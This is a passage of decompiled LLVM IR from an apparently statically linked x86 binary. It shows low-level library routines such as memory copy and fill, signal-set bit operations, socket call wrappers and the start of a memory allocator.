  %v3_80530cc = inttoptr i32 %v2_80530cc to i32*
  %v4_80530cc = load i32, i32* %v3_80530cc, align 4
  %v5_80530cc = add i32 %v4_80530cc, %v3_80530c7
  store i32 %v5_80530cc, i32* @ebx, align 4
  %v1_80530cf = add i32 %v5_80530cc, 8
  %v2_80530cf = inttoptr i32 %v1_80530cf to i16*
  %v3_80530cf = load i16, i16* %v2_80530cf, align 2
  %v4_80530cf = zext i16 %v3_80530cf to i32
  store i32 %v4_80530cf, i32* @edx, align 4
  %v2_80530d3 = add i32 %v4_80530cf, %v3_80530c7
  store i32 %v2_80530d3, i32* %v2_80530c7, align 4
  %v0_80530d8 = load i32, i32* @ebx, align 4
  %v1_80530d8 = add i32 %v0_80530d8, 4
  %v2_80530d8 = inttoptr i32 %v1_80530d8 to i32*
  %v3_80530d8 = load i32, i32* %v2_80530d8, align 4
  %v1_80530db = load i32, i32* @esi, align 4
  %v2_80530db = add i32 %v1_80530db, 16
  %v3_80530db = inttoptr i32 %v2_80530db to i32*
  store i32 %v3_80530d8, i32* %v3_80530db, align 4
  %v0_80530de = load i32, i32* @ebx, align 4
  %v1_80530de = inttoptr i32 %v0_80530de to i32*
  %v2_80530de = load i32, i32* %v1_80530de, align 4
  %v3_80530de = icmp eq i32 %v2_80530de, 0
  br i1 %v3_80530de, label %dec_label_pc_805309c, label %dec_label_pc_80530e3.loopexit

dec_label_pc_80530e3.loopexit:                    ; preds = %dec_label_pc_80530c7
  br label %dec_label_pc_80530e3

dec_label_pc_80530e3:                             ; preds = %dec_label_pc_80530e3.loopexit, %dec_label_pc_80530b9
  store i32 %v2_8053087, i32* @eax, align 4
  %v2_80530ec = call i32 @function_8054a80(i32 %v2_8053087, i32 1)
  %v0_80530f1 = load i32, i32* @ebx, align 4
  %v2_80530f6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80530f6, i32* @ebx, align 4
  store i32 %v0_8053075, i32* @esi, align 4
  ret i32 %v0_80530f1

; uselistorder directives
  uselistorder i32 %v1_80530d5, { 1, 0 }
  uselistorder i32 %v0_805309c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_80530c7, { 1, 0 }
}

define i32 @function_80530f9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80530f9:
  ret i32 ptrtoint (i32* @global_var_8057314.203 to i32)
}

define i32 @function_80530ff() local_unnamed_addr {
dec_label_pc_80530ff:
  %tmp = call i64 @__decompiler_undefined_function_5()
  %stack_var_-16 = alloca i32, align 4
  %v1_8053107 = bitcast i32* %stack_var_-16 to %tms*
  %v2_8053107 = call i32 @function_8055297(%tms* %v1_8053107)
  %v4_805310c = trunc i64 %tmp to i32
  %v4_8053110 = load i32, i32* %stack_var_-16, align 4
  %v5_8053110 = add i32 %v4_8053110, %v4_805310c
  %v3_8053117 = mul i32 %v5_8053110, 10000
  %v1_805311d = and i32 %v3_8053117, 2147483632
  ret i32 %v1_805311d

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_8053123(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053123:
  %tmp4 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8053124 = load i32, i32* @esi, align 4
  store i32 %v0_8053124, i32* %stack_var_-8, align 4
  %v4_8053125 = ptrtoint i8* %arg1 to i32
  %v9_8053131 = icmp ugt i8* %tmp4, %arg1
  %v1_8053133 = icmp eq i1 %v9_8053131, false
  br i1 %v1_8053133, label %dec_label_pc_805313b, label %dec_label_pc_8053135

dec_label_pc_8053135:                             ; preds = %dec_label_pc_8053123
  %v7_8053137 = call i8* @_memcpy(i8* %arg1, i8* %tmp4, i32 %arg3)
  br label %dec_label_pc_8053147

dec_label_pc_805313b:                             ; preds = %dec_label_pc_8053123
  %v3_805313b = add i32 %arg2, -1
  %v4_805313b = add i32 %v3_805313b, %arg3
  %v5_805313b = inttoptr i32 %v4_805313b to i8*
  %v3_805313f = add i32 %v4_8053125, -1
  %v4_805313f = add i32 %v3_805313f, %arg3
  %v5_805313f = inttoptr i32 %v4_805313f to i8*
  %v7_8053144 = call i8* @_memcpy(i8* %v5_805313f, i8* %v5_805313b, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8053147

dec_label_pc_8053147:                             ; preds = %dec_label_pc_8053135, %dec_label_pc_805313b
  %v2_8053147 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053147, i32* @esi, align 4
  ret i32 %v4_8053125

; uselistorder directives
  uselistorder i8* %tmp4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053147, { 1, 0 }
}

define i32 @function_805314a(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805314a:
  %v0_805314a = load i32, i32* @edi, align 4
  %v4_8053153 = ptrtoint i8* %arg1 to i32
  %v5_8053157 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_805314a, i32* @edi, align 4
  ret i32 %v4_8053153

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_805315f(i32 %arg1) local_unnamed_addr {
dec_label_pc_805315f:
  %stack_var_-4 = alloca i32, align 4
  %v2_8053162 = ptrtoint i32* %stack_var_-4 to i32
  %v2_805316b = inttoptr i32 %arg1 to i8*
  %v3_805316b = call i32 @function_8055369(i8* %v2_805316b, i32 %v2_8053162)
  %v1_8053176 = icmp eq i32 %v3_805316b, 0
  br i1 %v1_8053176, label %dec_label_pc_805317e, label %dec_label_pc_805317a

dec_label_pc_805317a:                             ; preds = %dec_label_pc_805315f
  %v3_805317a = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805317e

dec_label_pc_805317e:                             ; preds = %dec_label_pc_805315f, %dec_label_pc_805317a
  %v0_805317e = phi i32 [ -1, %dec_label_pc_805315f ], [ %v3_805317a, %dec_label_pc_805317a ]
  ret i32 %v0_805317e

; uselistorder directives
  uselistorder label %dec_label_pc_805317e, { 1, 0 }
}

define i32 @function_8053184(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053184:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805319f = ptrtoint i32* %stack_var_-12 to i32
  %v2_80531a6 = call i32 @function_8054db3(i32 5, i32 %v2_805319f)
  ret i32 %v2_80531a6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80531af(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80531af:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80531ca = ptrtoint i32* %stack_var_-12 to i32
  %v2_80531d1 = call i32 @function_8054db3(i32 2, i32 %v2_80531ca)
  ret i32 %v2_80531d1

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80531da(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80531da:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80531f5 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80531fc = call i32 @function_8054db3(i32 3, i32 %v2_80531f5)
  ret i32 %v2_80531fc

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8053205(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053205:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053220 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8053227 = call i32 @function_8054db3(i32 6, i32 %v2_8053220)
  ret i32 %v2_8053227

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8053230() local_unnamed_addr {
dec_label_pc_8053230:
  %stack_var_-20 = alloca i32, align 4
  %v2_805325b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8053262 = call i32 @function_8054db3(i32 15, i32 %v2_805325b)
  ret i32 %v2_8053262
}

define i32 @function_805326b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805326b:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_805327e = ptrtoint i32* %stack_var_-8 to i32
  %v2_8053285 = call i32 @function_8054db3(i32 4, i32 %v2_805327e)
  ret i32 %v2_8053285

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_805328e() local_unnamed_addr {
dec_label_pc_805328e:
  %stack_var_-16 = alloca i32, align 4
  %v2_80532b1 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80532b8 = call i32 @function_8054db3(i32 10, i32 %v2_80532b1)
  ret i32 %v2_80532b8
}

define i32 @function_80532c1() local_unnamed_addr {
dec_label_pc_80532c1:
  %stack_var_-24 = alloca i32, align 4
  %v2_80532f4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80532fb = call i32 @function_8054db3(i32 12, i32 %v2_80532f4)
  ret i32 %v2_80532fb
}

define i32 @function_8053304() local_unnamed_addr {
dec_label_pc_8053304:
  %stack_var_-16 = alloca i32, align 4
  %v2_8053327 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805332e = call i32 @function_8054db3(i32 9, i32 %v2_8053327)
  ret i32 %v2_805332e
}

define i32 @function_8053337() local_unnamed_addr {
dec_label_pc_8053337:
  %stack_var_-24 = alloca i32, align 4
  %v2_805336a = ptrtoint i32* %stack_var_-24 to i32
  %v2_8053371 = call i32 @function_8054db3(i32 11, i32 %v2_805336a)
  ret i32 %v2_8053371
}

define i32 @function_805337a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805337a:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_80533a5 = ptrtoint i32* %stack_var_-20 to i32
  %v2_80533ac = call i32 @function_8054db3(i32 14, i32 %v2_80533a5)
  ret i32 %v2_80533ac

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_80533b5(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80533b5:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80533d0 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80533d7 = call i32 @function_8054db3(i32 1, i32 %v2_80533d0)
  ret i32 %v2_80533d7

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8054db3, { 5, 4, 9, 3, 8, 2, 7, 1, 10, 0, 6, 11 }
}

define i32 @function_80533e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_80533e0:
  %v0_80533e3 = call i32 @function_8052c15()
  %v0_80533e8 = load i32, i32* @edx, align 4
  %v4_80533ef = call i32 @function_8052ca0(i32 %v0_80533e3, i32 %arg1, i32 %v0_80533e8, i32 %v0_80533e8)
  ret i32 %v4_80533ef

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @function_8052ca0, { 1, 0, 4, 3, 2 }
  uselistorder i32 ()* @function_8052c15, { 0, 2, 1 }
}

define i32 @function_80533f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_80533f8:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8053410, label %dec_label_pc_8053403

dec_label_pc_8053403:                             ; preds = %dec_label_pc_80533f8
  %v1_8053403 = add i32 %arg1, -64
  %v3_8053403 = sub i32 63, %arg1
  %v4_8053403 = and i32 %v3_8053403, %arg1
  %v5_8053403 = icmp slt i32 %v4_8053403, 0
  %v6_8053403 = icmp eq i32 %v1_8053403, 0
  %v7_8053403 = icmp slt i32 %v1_8053403, 0
  %v3_8053406 = icmp eq i1 %v7_8053403, %v5_8053403
  %v4_8053406 = icmp eq i1 %v6_8053403, false
  %v5_8053406 = and i1 %v4_8053406, %v3_8053406
  br i1 %v5_8053406, label %dec_label_pc_8053410, label %dec_label_pc_8053408

dec_label_pc_8053408:                             ; preds = %dec_label_pc_8053403
  %v4_805340b = call i32 @function_805350e(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8053410

dec_label_pc_8053410:                             ; preds = %dec_label_pc_8053403, %dec_label_pc_80533f8, %dec_label_pc_8053408
  %v1_8053410 = call i32 @function_80530f9(i32 ptrtoint (i32* @0 to i32))
  %v1_8053415 = inttoptr i32 %v1_8053410 to i32*
  store i32 22, i32* %v1_8053415, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8053403, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8053410, { 2, 0, 1 }
}

define i32 @function_8053422(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053422:
  %v3_8053430 = inttoptr i32 %arg1 to i8*
  %v4_8053430 = call i32 @function_805314a(i8* %v3_8053430, i32 0, i32 128)
  ret i32 0
}

define i32 @function_805343b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805343b:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_805343b = load i32, i32* @ebx, align 4
  %v15_805343c = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8053450 = icmp eq i32 %arg2, -1
  br i1 %v10_8053450, label %dec_label_pc_805345e, label %dec_label_pc_8053455

dec_label_pc_8053455:                             ; preds = %dec_label_pc_805343b
  %tmp25 = icmp slt i32 %arg1, 1
  br i1 %tmp25, label %dec_label_pc_805345e, label %dec_label_pc_8053459

dec_label_pc_8053459:                             ; preds = %dec_label_pc_8053455
  %v7_805345c = icmp sgt i32 %arg1, 64
  br i1 %v7_805345c, label %dec_label_pc_805345e, label %dec_label_pc_8053479.lr.ph

dec_label_pc_805345e:                             ; preds = %dec_label_pc_8053459, %dec_label_pc_8053455, %dec_label_pc_805343b
  %v1_805345e = call i32 @function_80530f9(i32 %v0_805343b)
  store i32 %v1_805345e, i32* %eax.global-to-local, align 4
  %v1_8053463 = inttoptr i32 %v1_805345e to i32*
  store i32 22, i32* %v1_8053463, align 4
  br label %dec_label_pc_80534df

dec_label_pc_8053479.lr.ph:                       ; preds = %dec_label_pc_8053459
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805347927 = add i32 %v15_805343c, 284
  %v5_805347928 = inttoptr i32 %v4_805347927 to i32*
  store i32 0, i32* %v5_805347928, align 4
  %v0_805348429 = load i32, i32* %eax.global-to-local, align 4
  %v1_805348430 = add i32 %v0_805348429, -1
  %v9_805348431 = icmp slt i32 %v1_805348430, 0
  store i32 %v1_805348430, i32* %eax.global-to-local, align 4
  %v1_805348532 = icmp eq i1 %v9_805348431, false
  br i1 %v1_805348532, label %dec_label_pc_8053479.dec_label_pc_8053479_crit_edge, label %dec_label_pc_8053487

dec_label_pc_8053479.dec_label_pc_8053479_crit_edge: ; preds = %dec_label_pc_8053479.lr.ph, %dec_label_pc_8053479.dec_label_pc_8053479_crit_edge
  %v1_805348433 = phi i32 [ %v1_8053484, %dec_label_pc_8053479.dec_label_pc_8053479_crit_edge ], [ %v1_805348430, %dec_label_pc_8053479.lr.ph ]
  %v0_8053479.pre = load i32, i32* @esp, align 4
  %v2_8053479 = mul i32 %v1_805348433, 4
  %v3_8053479 = add i32 %v0_8053479.pre, 160
  %v4_8053479 = add i32 %v3_8053479, %v2_8053479
  %v5_8053479 = inttoptr i32 %v4_8053479 to i32*
  store i32 0, i32* %v5_8053479, align 4
  %v0_8053484 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053484 = add i32 %v0_8053484, -1
  %v9_8053484 = icmp slt i32 %v1_8053484, 0
  store i32 %v1_8053484, i32* %eax.global-to-local, align 4
  %v1_8053485 = icmp eq i1 %v9_8053484, false
  br i1 %v1_8053485, label %dec_label_pc_8053479.dec_label_pc_8053479_crit_edge, label %dec_label_pc_8053487

dec_label_pc_8053487:                             ; preds = %dec_label_pc_8053479.dec_label_pc_8053479_crit_edge, %dec_label_pc_8053479.lr.ph
  %v0_8053487 = load i32, i32* @edx, align 4
  %v2_805348a = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_805348a, i32* %eax.global-to-local, align 4
  %v4_8053492 = call i32 @function_805350e(i32 %v2_805348a, i32 %arg1, i32 %v0_8053487, i32 %v0_8053487)
  store i32 %v4_8053492, i32* %eax.global-to-local, align 4
  %v2_805349a = icmp slt i32 %v4_8053492, 0
  br i1 %v2_805349a, label %dec_label_pc_80534df, label %dec_label_pc_805349e

dec_label_pc_805349e:                             ; preds = %dec_label_pc_8053487
  %v4_80534a6 = call i32 @function_80534ea(i32 ptrtoint (i32* @global_var_8057500.204 to i32), i32 %arg1, i32 %v4_8053492, i32 %v4_8053492)
  %v2_80534bf = ptrtoint i32* %stack_var_-284 to i32
  %v2_80534c4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80534c4, i32* %eax.global-to-local, align 4
  %v4_80534cd = call i32 @function_8054cbf(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_80534bf)
  store i32 %v4_80534cd, i32* %eax.global-to-local, align 4
  %v2_80534d5 = icmp slt i32 %v4_80534cd, 0
  br i1 %v2_80534d5, label %dec_label_pc_80534df, label %dec_label_pc_80534d9

dec_label_pc_80534d9:                             ; preds = %dec_label_pc_805349e
  %v3_80534d9 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_80534e2

dec_label_pc_80534df:                             ; preds = %dec_label_pc_805349e, %dec_label_pc_8053487, %dec_label_pc_805345e
  br label %dec_label_pc_80534e2

dec_label_pc_80534e2:                             ; preds = %dec_label_pc_80534d9, %dec_label_pc_80534df
  %storemerge = phi i32 [ -1, %dec_label_pc_80534df ], [ %v3_80534d9, %dec_label_pc_80534d9 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8053484, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 10, 11, 8, 9, 5, 6 }
  uselistorder i32 284, { 0, 4, 5, 6, 1, 2, 3, 7, 8, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_80534e2, { 1, 0 }
  uselistorder label %dec_label_pc_8053479.dec_label_pc_8053479_crit_edge, { 1, 0 }
}

define i32 @function_80534ea(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80534ea:
  %v1_80534f8 = add i32 %arg2, -1
  %v1_80534fb = urem i32 %v1_80534f8, 32
  %v2_80534fb = icmp eq i32 %v1_80534fb, 0
  %v2_80534fe = udiv i32 %v1_80534f8, 32
  br i1 %v2_80534fb, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_80534ea
  %v5_8053501 = shl i32 1, %v1_80534fb
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_80534ea, %bb
  %v6_8053503 = phi i32 [ 1, %dec_label_pc_80534ea ], [ %v5_8053501, %bb ]
  %v2_8053503 = mul nuw nsw i32 %v2_80534fe, 4
  %v3_8053503 = add i32 %v2_8053503, %arg1
  %v4_8053503 = inttoptr i32 %v3_8053503 to i32*
  %v5_8053503 = load i32, i32* %v4_8053503, align 4
  %v7_8053503 = and i32 %v5_8053503, %v6_8053503
  %v8_8053503 = icmp eq i32 %v7_8053503, 0
  %v1_8053507 = icmp eq i1 %v8_8053503, false
  %v2_8053507 = zext i1 %v1_8053507 to i32
  ret i32 %v2_8053507

; uselistorder directives
  uselistorder i32 %v1_80534fb, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_805350e(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805350e:
  %stack_var_-4 = alloca i32, align 4
  %v0_805350e = load i32, i32* @ebx, align 4
  store i32 %v0_805350e, i32* %stack_var_-4, align 4
  %v1_805351c = add i32 %arg2, -1
  %v1_805351f = urem i32 %v1_805351c, 32
  %v2_805351f = icmp eq i32 %v1_805351f, 0
  store i32 %v1_805351f, i32* @ecx, align 4
  %v2_8053522 = udiv i32 %v1_805351c, 32
  store i32 %v2_8053522, i32* @edx, align 4
  br i1 %v2_805351f, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_805350e
  %v5_8053525 = shl i32 1, %v1_805351f
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_805350e, %bb
  %v6_8053527 = phi i32 [ 1, %dec_label_pc_805350e ], [ %v5_8053525, %bb ]
  %v2_8053527 = mul nuw nsw i32 %v2_8053522, 4
  %v3_8053527 = add i32 %v2_8053527, %arg1
  %v4_8053527 = inttoptr i32 %v3_8053527 to i32*
  %v5_8053527 = load i32, i32* %v4_8053527, align 4
  %v7_8053527 = or i32 %v5_8053527, %v6_8053527
  store i32 %v7_8053527, i32* %v4_8053527, align 4
  %v2_805352c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805352c, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8053522, { 1, 0 }
  uselistorder i32 %v1_805351f, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_805352e() local_unnamed_addr {
dec_label_pc_805352e:
  %v0_805352e = load i32, i32* @eax, align 4
  %v6_8053541 = icmp ugt i32 %v0_805352e, 16777215
  br i1 %v6_8053541, label %dec_label_pc_8053552, label %dec_label_pc_8053543

dec_label_pc_8053543:                             ; preds = %dec_label_pc_805352e
  %tmp = icmp ult i32 %v0_805352e, 256
  %v2_8053531 = udiv i32 %v0_805352e, 256
  %v2_8053543 = call i32 @llvm.ctlz.i32(i32 %v2_8053531, i1 true)
  %v3_8053543 = xor i32 %v2_8053543, 31
  %v5_8053543 = select i1 %tmp, i32 95, i32 %v3_8053543
  %v1_8053546 = add nuw nsw i32 %v5_8053543, 6
  %v2_8053549 = urem i32 %v1_8053546, 32
  %v4_8053549 = icmp eq i32 %v2_8053549, 0
  br i1 %v4_8053549, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8053543
  %v5_8053549 = lshr i32 %v0_805352e, %v2_8053549
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8053543, %bb
  %v0_805354b = phi i32 [ %v0_805352e, %dec_label_pc_8053543 ], [ %v5_8053549, %bb ]
  %v1_805354b = urem i32 %v0_805354b, 4
  %v2_805354e = mul nuw nsw i32 %v5_8053543, 4
  %v3_805354e = or i32 %v1_805354b, 32
  %v4_805354e = add nuw nsw i32 %v3_805354e, %v2_805354e
  br label %dec_label_pc_8053552

dec_label_pc_8053552:                             ; preds = %dec_label_pc_805352e, %bb4
  %v0_8053553 = phi i32 [ 95, %dec_label_pc_805352e ], [ %v4_805354e, %bb4 ]
  ret i32 %v0_8053553

; uselistorder directives
  uselistorder i32 %v2_8053549, { 1, 0 }
  uselistorder i32 %v0_805352e, { 2, 3, 1, 0, 4 }
  uselistorder i1 true, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053552, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_8053554(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053554:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053554 = load i32, i32* @ebp, align 4
  %v0_8053555 = load i32, i32* @edi, align 4
  %v0_8053556 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8053569 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053569, i32* @eax, align 4
  store i32 %v2_8053569, i32* %stack_var_-92, align 4
  %v2_805356e = call i32 @function_8054a80(i32 %v2_8053569, i32 134564477)
  store i32 %v2_805356e, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80571e0.205 to i32), i32* %stack_var_-92, align 4
  %v1_805357a = call i32 @function_8054a7d(i32 ptrtoint (i32* @global_var_80571e0.205 to i32))
  store i32 %v1_805357a, i32* %eax.global-to-local, align 4
  %v0_8053582 = load i32, i32* %ebx.global-to-local, align 4
  %tmp124 = icmp ult i32 %v0_8053582, -32
  br i1 %tmp124, label %dec_label_pc_8053599, label %dec_label_pc_8053587

dec_label_pc_8053587:                             ; preds = %dec_label_pc_8053554
  %v0_8053587 = load i32, i32* %stack_var_-92, align 4
  %v1_8053587 = call i32 @function_80530f9(i32 %v0_8053587)
  store i32 %v1_8053587, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805358e = inttoptr i32 %v1_8053587 to i32*
  store i32 12, i32* %v1_805358e, align 4
  br label %dec_label_pc_8053cbe

dec_label_pc_8053599:                             ; preds = %dec_label_pc_8053554
  %v1_8053599 = add i32 %v0_8053582, 11
  %tmp125 = icmp ult i32 %v1_8053599, 16
  br i1 %tmp125, label %dec_label_pc_80535b0, label %dec_label_pc_80535a9

dec_label_pc_80535a9:                             ; preds = %dec_label_pc_8053599
  %v1_80535a9 = and i32 %v1_8053599, -8
  br label %dec_label_pc_80535b0

dec_label_pc_80535b0:                             ; preds = %dec_label_pc_8053599, %dec_label_pc_80535a9
  %storemerge135 = phi i32 [ %v1_80535a9, %dec_label_pc_80535a9 ], [ %v1_8053599, %dec_label_pc_8053599 ]
  %v1_8053948 = phi i32 [ %v1_80535a9, %dec_label_pc_80535a9 ], [ 16, %dec_label_pc_8053599 ]
  store i32 %storemerge135, i32* %eax.global-to-local, align 4
  %v0_80535b0 = load i8, i8* @global_var_8057580.206, align 1
  %v1_80535b0 = sext i8 %v0_80535b0 to i32
  store i32 %v1_80535b0, i32* @ebx, align 4
  %v3_80535b6 = urem i8 %v0_80535b0, 2
  %v4_80535b6 = icmp eq i8 %v3_80535b6, 0
  %v1_80535b9 = icmp eq i1 %v4_80535b6, false
  br i1 %v1_80535b9, label %dec_label_pc_80535d8, label %dec_label_pc_80535bb

dec_label_pc_80535bb:                             ; preds = %dec_label_pc_80535b0
  %v2_80535bb = icmp eq i8 %v0_80535b0, 0
  %v1_80535bd = icmp eq i1 %v2_80535bb, false
  br i1 %v1_80535bd, label %dec_label_pc_80538b3, label %dec_label_pc_80535c3

dec_label_pc_80535c3:                             ; preds = %dec_label_pc_80535bb
  store i32 ptrtoint (i8* @global_var_8057580.206 to i32), i32* %stack_var_-92, align 4
  %v2_80535cb = call i32 @function_8054171(i32* bitcast (i8* @global_var_8057580.206 to i32*))
  store i32 %v2_80535cb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80538b3

dec_label_pc_80535d8:                             ; preds = %dec_label_pc_80535b0
  %v11_80535d8 = trunc i32 %v1_8053948 to i8
  %v8_80535dc = icmp ugt i8 %v11_80535d8, %v0_80535b0
  br i1 %v8_80535dc, label %dec_label_pc_80535f9, label %dec_label_pc_80535de

dec_label_pc_80535de:                             ; preds = %dec_label_pc_80535d8
  %v2_80535e2 = udiv i32 %v1_8053948, 2
  store i32 %v2_80535e2, i32* %eax.global-to-local, align 4
  %v1_80535e4 = add i32 %v2_80535e2, ptrtoint (i8* @global_var_8057580.206 to i32)
  store i32 %v1_80535e4, i32* %ecx.global-to-local, align 4
  %v1_80535ea = add i32 %v2_80535e2, add (i32 ptrtoint (i8* @global_var_8057580.206 to i32), i32 -4)
  %v2_80535ea = inttoptr i32 %v1_80535ea to i32*
  %v3_80535ea = load i32, i32* %v2_80535ea, align 4
  store i32 %v3_80535ea, i32* @edx, align 4
  %v1_80535ed = icmp eq i32 %v3_80535ea, 0
  br i1 %v1_80535ed, label %dec_label_pc_80535f9, label %dec_label_pc_80535f1

dec_label_pc_80535f1:                             ; preds = %dec_label_pc_80535de
  %v1_80535f1 = add i32 %v3_80535ea, 8
  %v2_80535f1 = inttoptr i32 %v1_80535f1 to i32*
  %v3_80535f1 = load i32, i32* %v2_80535f1, align 4
  store i32 %v3_80535f1, i32* %eax.global-to-local, align 4
  store i32 %v3_80535f1, i32* %v2_80535ea, align 4
  br label %dec_label_pc_8053632

dec_label_pc_80535f9:                             ; preds = %dec_label_pc_80535de, %dec_label_pc_80535d8
  %v8_80535f9 = icmp ult i32 %v1_8053948, 255
  %v6_8053601 = icmp ugt i32 %v1_8053948, 255
  store i32 %v1_8053948, i32* @eax, align 4
  br i1 %v6_8053601, label %dec_label_pc_805363a, label %dec_label_pc_8053603

dec_label_pc_8053603:                             ; preds = %dec_label_pc_80535f9
  %v2_8053607 = udiv i32 %v1_8053948, 8
  store i32 %v2_8053607, i32* %eax.global-to-local, align 4
  %v1_805360e = mul nuw i32 %v2_8053607, 8
